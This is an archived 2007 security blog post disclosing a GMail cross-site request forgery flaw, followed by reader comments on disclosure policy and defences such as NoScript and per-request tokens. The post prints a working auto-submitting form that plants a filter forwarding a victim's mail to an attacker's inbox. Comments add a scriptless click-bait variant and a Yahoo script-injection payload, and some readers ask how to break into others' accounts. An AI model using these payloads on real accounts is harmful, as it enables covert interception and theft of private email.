<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Google GMail E-mail Hijack Technique</title><meta name="description" content="In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations."><meta property="name" content="Google GMail E-mail Hijack Technique"><meta itemprop="name" content="Google GMail E-mail Hijack Technique"><meta property="description" content="In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations."><meta itemprop="description" content="In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations."><meta property="image" content="https://www.gnucitizen.org/files/2007/09/ggeht-seq1-248x150.jpg &quot;GGEHT Seq1&quot;"><meta itemprop="image" content="https://www.gnucitizen.org/files/2007/09/ggeht-seq1-248x150.jpg &quot;GGEHT Seq1&quot;"><meta property="og:type" content="website"><meta property="og:url" content="https://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/"><meta property="og:title" content="Google GMail E-mail Hijack Technique"><meta property="og:description" content="In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations."><meta property="og:image" content="https://www.gnucitizen.org/files/2007/09/ggeht-seq1-248x150.jpg &quot;GGEHT Seq1&quot;"><meta name="twitter:title" content="Google GMail E-mail Hijack Technique"><meta name="twitter:description" content="In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations."><meta name="twitter:card" content="summary_large_image"><meta name="twitter:image" content="https://www.gnucitizen.org/files/2007/09/ggeht-seq1-248x150.jpg &quot;GGEHT Seq1&quot;"><link type="text/css" href="/blog.css" rel="stylesheet"><script type="text/javascript" src="/blog.js"></script></head><body><header id="header"><h1><a href="/"></a></h1><p></p></header><nav id="topnav"><ul><li><a href="/">Home</a></li><li><a href="/projects.html">Projects</a></li><li><a href="/files">Files</a></li><li><a href="/about.html">About</a></li></ul></nav><article><div id="content"><h1 class="title">Google GMail E-mail Hijack Technique</h1><div class="date">Tue, 25 Sep 2007 18:50:33 GMT</div><div class="author">by pdp</div><div id="post-content"><p>In this post I am going to show you how someone can remotely install a simple, persistent filter within a GMail account and download all previous as well as snoop onto all future email conversations.</p>
<p>The following sequence of screenshots describes how the attack works.</p>
<div class="screen">[![GGEHT Seq1](/files/2007/09/ggeht-seq1-248x150.jpg "GGEHT Seq1")](/files/2007/09/ggeht-seq1.jpg) [![GGEHT Seq2](/files/2007/09/ggeht-seq2-248x150.jpg "GGEHT Seq2")](/files/2007/09/ggeht-seq2.jpg) [![GGEHT Seq3](/files/2007/09/ggeht-seq3-248x150.jpg "GGEHT Seq3")](/files/2007/09/ggeht-seq3.jpg)</div>

<p>The victim visits a malicious page while being logged into GMail. Upon that, the page performs a <code>multipart/form-data</code> <code>POST</code> to one of the GMail alternative interfaces and injects a filter into the victim&#39;s filter list. In the example above, the attacker writes a filter, which simply looks for emails with attachments and forward them to an email of their choice. This filter will automatically transfer all emails matching the rule. Keep in mind that future emails will be forwarded as well. The attack will remain <strong>present</strong> for as long as the victim has the filter within their filter list, even if the initial vulnerability, which was the cause of the injection, is fixed by Google.</p>
<p>The technique used in this example is known as Cross-site request forgery, or simply CSRF. I am not planning to go into details how it works. Just look it up on this blog or with your favourite search engine.</p>
<p>I am not planning to release the details of this vulnerability for now. The exploit was verified by <a href="http://blogs.zdnet.com/security/">Ryan Naraine</a> and several close friends. It does work and it is nasty if you ask me.</p>
<p><strong>UPDATE 2007/09/28</strong>: I promised to release the POC as soon as Google fixes the vulnerability. Well they did. So, here are the details:</p>
<pre><code>&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;evilinbox@mailinator.com&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_from&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_to&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_subj&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_has&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_hasnot&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;cf1_attach&quot; value=&quot;true&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;tfi&quot; value=&quot;&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;s&quot; value=&quot;z&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; 
    &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; 
&lt;/form&gt; 
&lt;script&gt; 
    document.forms[0].submit();
&lt;/script&gt;</code></pre><p><em>The actual exploit can be launched from <a href="/files/2007/09/ggeht-exploit.htm">here</a>. It makes use of a CSRF redirection utility to simplify the process.</em></p>
</div><div id="post-comments"><p><em>Archived Comments</em></p><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b6ef85fccd69e62ad1debf90ce3e8db4?s=256&amp;d=retro" alt="buherator"><span class="post-comment-author">buherator</span><div class="post-comment-content">I think beford was faster: http://blog.beford.org/?p=3</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">buherator, this is a different exploit/vulnerability all together...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/60b7efe2b404b2704902e50c23c2e164?s=256&amp;d=retro" alt="xen ix"><span class="post-comment-author">xen ix</span><div class="post-comment-content">Wow. Checked my Filters right away and gladly I haven't been affected.

Keep up the great work.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=256&amp;d=retro" alt="Anonymous"><span class="post-comment-author">Anonymous</span><div class="post-comment-content">I'm all for giving the developer time to fix a bug, but why simultaneously disclose without detail?  There are plenty of smart people that will use it as information pointing to something that is interesting and will likely also find the bug.  Not very useful.  If you don't like full public disclosure, say nothing at all until a fix is in place.

You do great work and I enjoy reading the technical details of your disclosures and research.  I'm not sure this new disclosure experiment is any better than someone saying, "There is a critical bug in IE.  Don't use it".

Please do keep up the good work even if some of us are critical of your new disclosure policy.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">CSRF using POST, right? Can I assume what I'm assuming about mitigation provided by a certain Firefox extension?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/d1e239246ee02acb2956696cd53d99db?s=256&amp;d=retro" alt="troika"><span class="post-comment-author">troika</span><div class="post-comment-content">i don't know if people realize How Much these bugs can be dangerous. E-mail is a very very personal space,the user trust it. 

I like G.ogle but, it should slow down a bit. There  are too much services/features. The user have no time to fully understand how it works and it's weakness. The Course To Web 2.0 it's becoming very dangerous.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Giorgio, I thought that NoScript can prevent JavaScript from executing only, but it cannot prevent POST forms to submit if the user clicks on it right? Nevertheless, the attack will be a lot more difficult without JavaScript, unless there is a way to say that the forms should submit when it renders without using any scripting at all.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">Petko, NoScript by default prevents every each cross-site POST from untrusted sites as part of its anti-XSS countermeasures which, incidentally, do work as anti-CSRF countermeasures in the best-practice case of POST used for non-idempotent requests, like GMail filters do.

So even if you manage to trick user into clicking a submit button (e.g. using clever CSS disguises), the payload will be stripped out :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Giorgio, sounds good but doesn't that break things. I mean, CSRF is one of the most fundamental Web characteristic. Disabling it might be ok for people like us, but for the general population, that is a no go! I am not trying to make people more vulnerable. I want for the the extension to succeed. But that wont happen if it breaks pages.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/60b7efe2b404b2704902e50c23c2e164?s=256&amp;d=retro" alt="xen ix"><span class="post-comment-author">xen ix</span><div class="post-comment-content">@Anonymous: This is what happens if you silently wait for someone to fix a bug.

http://bitsex.net/2007/09/norwegian-police-fucks-up/

Is this what you want?

What pdp is doing is very honourable. Not only does he warn us, but he keeps a lid on how to do it. If he let people know how to do it, then we would have a bunch of script kiddies probably making a mess. Now those who know and might find out how to do it are so few, so most of us won't notice it, and it will be hopefully fixed within it might get very critical.

So again, what do you want? A silent warning or no warning at all?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">Petko, this anti-CSRF feature has been in place for six months now (since March, 18th) and nobody complained about it. Consider that by default NoScript filters exclusively cross-site POST requests *from untrusted to trusted* sites, and as such is very unlikely to break anything legitimate.

Why should you want an untrusted site to modify the state (that's what POST is for) of a site you trust? At any rate, I repeat: I didn't receive any complaint about it, and many people didn't even notice -- just like you ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b58996c504c5638798eb6b511e6f49af?s=256&amp;d=retro" alt="Anonymous"><span class="post-comment-author">Anonymous</span><div class="post-comment-content">@xen ix

I'm not too interested in the script kiddie effect.  Yes, they can cause a severe nuisance.

What I am more concerned about are those with equal or greater talents than the public researchers that are tipped off as to where to look.  As you say, they are few and most of us won't notice when they succeed.  What partial disclosure does is to raise the awareness of those who can exploit a weakness as they WILL know what to look for.

I am in the full public disclosure camp, following a reasonable private disclosure timeout to the vendor.  While you await a vendor fix in whatever timeline suits you as the discloser, don't tip your hat to the people who have no ethics.

pdp does a great service to the community at large.  My only gripe is that if there is a public disclosure of any kind, make it full so that mitigations can be researched.  If you are working with the vendor and don't want to make a full disclosure because the vendor has not yet fixed the issue, don't publicly disclose at all.  When the vendor either fixes the problem or stops working with you, go for full public disclosure.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Giorgio, that's all cool. However, I've seen many many different setups, especially Intranet ones, that require CSRF to work. In one recent case, the company that I was consulting had to even reduce the security level for the Internet zone, from the domain controller, in order to make their Web app work, since it requires users to be able to open file&#58;// URLs. You call that crazy. I call that crazy, but this is the real world.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5e0f595cbc8f1811233adce10ac6c5d3?s=256&amp;d=retro" alt="Awesome AnDrEw"><span class="post-comment-author">Awesome AnDrEw</span><div class="post-comment-content">Another awesome disclosure, pdp. I always enjoy the creative uses you find for vulnerabilities. I don't believe I ever would have thought to combine a filter with a CSRF in order to create a persistent issue within any mail service. Nice work.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">Petko, not to be picky, but they need CSR, not CSRF to work :) Anyway, NoScript is very configurable on this side: "NoScript Options|Advanced|XSS|Exceptions"</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a3b620701f9268c2da5b7d8eb8c36935?s=256&amp;d=retro" alt="LiquidBrain"><span class="post-comment-author">LiquidBrain</span><div class="post-comment-content">Very interesting... tried and works... Great thinking...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/89886495b27cfdc78593e1f5c8810594?s=256&amp;d=retro" alt=".mario"><span class="post-comment-author">.mario</span><div class="post-comment-content">Very nice find again - and a signal to not underestimate CSRF like usual.

@Giorgio: I didn't know about the CSRF protection yet - great thing.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">"Nevertheless, the attack will be a lot more difficult without JavaScript, unless there is a way to say that the forms should submit when it renders without using any scripting at all."

Guys,

Let's remember that even if you don't allow scripting from a certain domain (i.e.: using NoScript), we can still forge a POST request by simply tricking the user to click on a image. I love using the thumbnail of a hot chick for demo purposes. Come on, don't tell me you wouldn't click on it to make the picture bigger! :-D

<pre><code>&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;
Click on the thumbnail to zoom in!&lt;br&gt;&lt;br&gt;
&lt;form action=&quot;http://mail.google.com/blah/blah.py&quot; method=&quot;post&quot;&gt;
&lt;input type=&quot;text&quot; name=&quot;param1&quot; value=&quot;whatever1&quot; style=&quot;display: none;&quot; /&gt;
&lt;input type=&quot;text&quot; name=&quot;param2&quot; value=&quot;whatever2&quot; style=&quot;display: none;&quot; /&gt;
&lt;input type=&quot;image&quot; src=&quot;http://somewhere.com/hotchick.jpg&quot; value=&quot;Login&quot;&gt;
&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre>

I really doubt NoScript can stop the previous code, as we don't use JavaScript. Anyways, this vulnerability is a KILLER and gives me lots of new ideas to poke with webmail services out there.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/290e868e00e8429bf1624a461b8ef81e?s=256&amp;d=retro" alt="Giorgio Maone"><span class="post-comment-author">Giorgio Maone</span><div class="post-comment-content">Adrian,
You probably missed my comment http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/#comment-52628 and the discussion which followed.

In short, NoScript actually prevents this kind of attack even if the attacker uses a scriptless CSRF vector like yours, and the countermeasure proved to be so much transparent that neither you nor Petko noticed it even if it's there since six months ago ( http://noscript.net/changelog#1.1.4.6.070318 ): cross-site POST requests from untrusted sites are turned into no-data GET.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ab78075bda345e40a6da0a50b8d45841?s=256&amp;d=retro" alt="Frizz"><span class="post-comment-author">Frizz</span><div class="post-comment-content">gmail BETA, verry inportant to read the beta thing ;)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c01ec1960cee5bc724047823e264550e?s=256&amp;d=retro" alt="hnky"><span class="post-comment-author">hnky</span><div class="post-comment-content">What happens when you delete the filter?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/1051a47d9d7e30b74ed68e9d7bc02d72?s=256&amp;d=retro" alt="Vincent van den Brink"><span class="post-comment-author">Vincent van den Brink</span><div class="post-comment-content">Nice found! To Google to fix it.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/3f97990bcee4216af83a7181d49581d2?s=256&amp;d=retro" alt="DrByte"><span class="post-comment-author">DrByte</span><div class="post-comment-content">Your friend Ryan Naraine disclosed the exploit in his plagiarism of your article and even included links to an EVIL site with the LIVE exploit, so that the unaware could get infected first hand.

That's not the kind of education I need... I have requested that he edit the article with no response.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/b9ecc11019cfb35028b995dd754bab7e?s=256&amp;d=retro" alt="Amanda"><span class="post-comment-author">Amanda</span><div class="post-comment-content">I can't say nothing...

just...

Wow...

lol

Congrats for your great job!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/42546023414d7251a54379ddf98675b7?s=256&amp;d=retro" alt="jumpin joe"><span class="post-comment-author">jumpin joe</span><div class="post-comment-content">How Do We Fix This Vulnerability?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5d1658ac36692c8b5ff5612aa9d6a837?s=256&amp;d=retro" alt="rezn"><span class="post-comment-author">rezn</span><div class="post-comment-content">DrByte: the links in Narrine's blog are to an older, already patched exploit.  I don't know why he linked to PoCs for something that is patched.

PDP: I just want to say that it is great how you have stepped up the technical content in the blog again, even if I'm not quite in agreement with your (non)disclosure technique.  But its your choice, so i won't bother complaining or debating.

Anyway, nice job on the recent vulns, including this one.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5fd77a2be33565709c3a79091e31bd4d?s=256&amp;d=retro" alt="vsync"><span class="post-comment-author">vsync</span><div class="post-comment-content"><blockquote>Let's remember that even if you don't allow scripting from a certain domain (i.e.: using NoScript), we can still forge a POST request by simply tricking the user to click on a image.</blockquote>

Yes, and that's why various RFCs recommend that servers only take action on POST requests, and that user agents make POST actions visually distinct.  Another wise and obvious rule broken by "designers".</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8f3c9f368e554f1126a7563e679a4de6?s=256&amp;d=retro" alt="Panio Donev"><span class="post-comment-author">Panio Donev</span><div class="post-comment-content">Good job. Only maybe you should have notified google first (and ask for a hefty ransom :-)).</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">Giorgio Maone,

That's actually pretty cool, nice work! I'm a big fan of NoScript btw!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8e1b4a5b128ddf2323e289e299d3bf55?s=256&amp;d=retro" alt="Lizandro Diaz"><span class="post-comment-author">Lizandro Diaz</span><div class="post-comment-content">Com'on GMAIL this is the second time, this happens, enough is enough.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/de37b9dc788b0268d438591e085e4496?s=256&amp;d=retro" alt="sirdarckcat"><span class="post-comment-author">sirdarckcat</span><div class="post-comment-content">yeap, the bug has been fixed, as you can see, the request now has a new field named "at", that has 2 hex-strings separated by a slash, the first one appears to be a session identifier, and the second a counter.

Greetz!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">check above for further details on the vulnerability...</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/fd137cf8185b5b71f0c8fe5eda095375?s=256&amp;d=retro" alt="MuyCapaz"><span class="post-comment-author">MuyCapaz</span><div class="post-comment-content">Forgive my ignorance, but wouldn't launching every click in a separate virtual machine sandbox go a long way toward a solution?  No cross pollination, no problem, right?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/271ecedbd232e23677ddc1d3956147eb?s=256&amp;d=retro" alt="hackathology"><span class="post-comment-author">hackathology</span><div class="post-comment-content">nice one pdp!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ef14ae4ef69235fa6c3709438357819d?s=256&amp;d=retro" alt="Adrian Pastor"><span class="post-comment-author">Adrian Pastor</span><div class="post-comment-content">Is it just me, or is this the security post with the biggest number of trackbacks on the planet? :-D</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">MuyCapaz, the sandboxing model will help protecting you box but not your data!!!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/4845d1f3289ed725286d4813cc3e267f?s=256&amp;d=retro" alt="thornade"><span class="post-comment-author">thornade</span><div class="post-comment-content">Did someone know if this other bugs has been fixed http://xs-sniper.com/blog/Google-Docs-Cross-Domain-Hole/

It concerns Google Docs &amp; Crossdomain.xml

Thorn</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/09cfb4a035d13bf45d6fd8fec4038926?s=256&amp;d=retro" alt="SNaRe"><span class="post-comment-author">SNaRe</span><div class="post-comment-content">I heard that google fixed this problem</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5408a73f5f7447ddce88388df02b3ea7?s=256&amp;d=retro" alt="alok"><span class="post-comment-author">alok</span><div class="post-comment-content">this is good but it has some problem like it doesn't  describe a lot about hw it hack the email account.... it requires little bit more description</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/bf5a66d322fc6b46324b6a3abbb0e5ff?s=256&amp;d=retro" alt="0kn0ck"><span class="post-comment-author">0kn0ck</span><div class="post-comment-content">Good stuff man!.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/a6b622d8559f7b1076935035bddb6627?s=256&amp;d=retro" alt="Romain Wartel"><span class="post-comment-author">Romain Wartel</span><div class="post-comment-content">This is the second CSRF affecting GMail recently. Is there any details on how they fixed the two vulnerabilities?

Romain.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/e44fac1db15566e303ccba6bf3de2812?s=256&amp;d=retro" alt="Ranjkar"><span class="post-comment-author">Ranjkar</span><div class="post-comment-content">That's actually pretty cool, nice work! I'm a big fan of NoScript btw!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/effdd00f4c4b6ad3e0ee33d05843999a?s=256&amp;d=retro" alt="MARKY"><span class="post-comment-author">MARKY</span><div class="post-comment-content">Salut,</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/598702cfa66c64bf2236a7020e54ee34?s=256&amp;d=retro" alt="Hacker"><span class="post-comment-author">Hacker</span><div class="post-comment-content">Yahoo has similar attack holes in http://omg.yahoo.com/

Attack example

http://omg.yahoo.com/happy-birthday-zac/photos/810/6

1. Get yahoo 360 blog ... upload your picture in the blog and select the picture to be shared in settings.

2. Go to above omg.Yahoo.com/something and comment in the box with any evil script type url.

Now the example attack im using is with 360.

Post: <code>"&gt;YahooHacked');"&gt;</code>

This script will replace all others users avatars with your own avatar and you will recive a Yahoo Admin Email and might have your account closed ... Enjoy</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/5eec41ca815936ff4fa0b38e2d48273d?s=256&amp;d=retro" alt="brielle"><span class="post-comment-author">brielle</span><div class="post-comment-content">lol...this makes no sense 2 me...it sounds great however does this stuff work 2 catch a cheating spouse???</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/604619bdf37843700f1dc622ba8c6bf0?s=256&amp;d=retro" alt="grawity"><span class="post-comment-author">grawity</span><div class="post-comment-content">came here by browsing archives... is the account in seq1.jpg yours? it looks that the jvyyuie guy is adding all the Wink to his friends.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/fab9bf307725606556840d9a5f291c5c?s=256&amp;d=retro" alt="sexyman"><span class="post-comment-author">sexyman</span><div class="post-comment-content">thanks for keeping us up to speed and even moreso for making sure these script kiddies don't figure out how to do it (eventho fixed). keep up the good work!</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/6bc4d517679a88c599148f1c188984f5?s=256&amp;d=retro" alt="Rockdrala"><span class="post-comment-author">Rockdrala</span><div class="post-comment-content">You fix the exploit by not opening mail or clicking on any links in mail from people you dont know silly :p 

This crap is old. Anyone can sploit this.  

This technique has been out long before Gmail was even a thought. And its one of those things thats always going to be around. 

Some people use mail server hacks where they can send a email completely from a email like "support@paypal.com" and have the paypal page in the email but when you click on the link it goes to there cookie sploiting site instead of people or even worse may collect your login information becuase your too silly to look at the url or they have a URL rewrite filter that makes it look like its paypal. 

The only thing you can do to fight these things. 

1. Dont open mail from people you dont know. 
2. If the mail is from a potential customer "someone you need to meet through email as a new person" then setup a email address for that flow like sales@mydomain.com Makes sure the mail is scanned for virus and spoof checked. 
3. Use a smaller email provider. Smaller email service providers can take more care in adding custom SPF records and spam filters in the Mail server for your pop and smtp service that checks headers and makes the mail actually comes from what it says its coming from.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/d9892a954dd3f8e0279c7442a853cebd?s=256&amp;d=retro" alt="Green Party Guy"><span class="post-comment-author">Green Party Guy</span><div class="post-comment-content">Thanks for posting this. A good friend had their account compromised and they wondering why their domain name registrations were stolen from them.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Green Party Guy, we are aware of the case, though it is very hard to define the method the attacker has used in order to hijack the account in question.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8c22e050952b477eeebb21d62e0c0ed2?s=256&amp;d=retro" alt="Consumed Consumer"><span class="post-comment-author">Consumed Consumer</span><div class="post-comment-content">Very informative, esp. the trick for NoScript (kiddies) :)</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/88f225d9d64d501561b86e7037fb9158?s=256&amp;d=retro" alt="Nicolae Namolovan"><span class="post-comment-author">Nicolae Namolovan</span><div class="post-comment-content">I think CSRF can be easily defeated by checking referer. If your site is not supposed to receive any POST from any 3th party side, then check where POST comes from and block them altogether.
Surprised that gmail is not doing this..</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/c4db4e65c9f09f2a373fcaefa5e2bfb4?s=256&amp;d=retro" alt="pdp"><span class="post-comment-author">pdp</span><div class="post-comment-content">Nicolae, refers can be spoofed, not to mention that you can configure your browser not to send them at all. Therefore, CSRF protection based on refers only is not a solution. The only solution is to implement random tokens per request and store their values within the form you want to check for a CSRF condition. This works and this is what the Google folks tried to do, although their implementation was seriously flawed.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/305eeb15fb40f7f0339209702e6a87f3?s=256&amp;d=retro" alt="adilah"><span class="post-comment-author">adilah</span><div class="post-comment-content">I would like to hack into my friends account i believe that she is hidding something from me</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/3570a47862e0b2379244fa18f0a73ae2?s=256&amp;d=retro" alt="Rogger"><span class="post-comment-author">Rogger</span><div class="post-comment-content">Hey....

I m not understanding what have to do in the filter.... can anyone plz tell me......</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/189f9c2030626bd7d8f436eb985fbd9f?s=256&amp;d=retro" alt="rok"><span class="post-comment-author">rok</span><div class="post-comment-content">but these days mitm is possible though..:d</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/ea8095e8899f0ef382a7ba873e32441f?s=256&amp;d=retro" alt="Johnes I."><span class="post-comment-author">Johnes I.</span><div class="post-comment-content">I have been locked out of my gmail account. How do I hack back in?</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/9c852609f51d72fbc6eaa4303d090d92?s=256&amp;d=retro" alt="Jay"><span class="post-comment-author">Jay</span><div class="post-comment-content">Wow, lifesavers, you guys totally rock.  My problem is that I think I have a total data stream process on me - from gmail, devart, facebook, google searching - everything.  May also have got into or are trying to get into my ISP email.  My complete digital footprint seems to have been uplifted and is being taunted back to me on various bogus sites found through combining my various identity markers in google searches.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/38de284147db9f4311379749056913b2?s=256&amp;d=retro" alt="rmadeat"><span class="post-comment-author">rmadeat</span><div class="post-comment-content">Quote :

Wow, lifesavers, you guys totally rock. My problem is that I think I have a total data stream process on me - from gmail, devart, facebook, google searching - everything. May also have got into or are trying to get into my ISP email. My complete digital footprint seems to have been uplifted and is being taunted back to me on various bogus sites found through combining my various identity markers in google searches.</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/45a98ec32e490772c0d0ca3a8e04951e?s=256&amp;d=retro" alt="tiesto"><span class="post-comment-author">tiesto</span><div class="post-comment-content">Love You Gmail :p</div></div><div class="post-comment"><img class="post-comment-avatar" src="//gravatar.com/avatar/8fc0f7a4ee9a43d890a12ea25cb8ad85?s=256&amp;d=retro" alt="Edward"><span class="post-comment-author">Edward</span><div class="post-comment-content">2 points. 

1. the perp could create the filter temporarily then delete it &amp; repeat etc. how would one know it have ever been there?
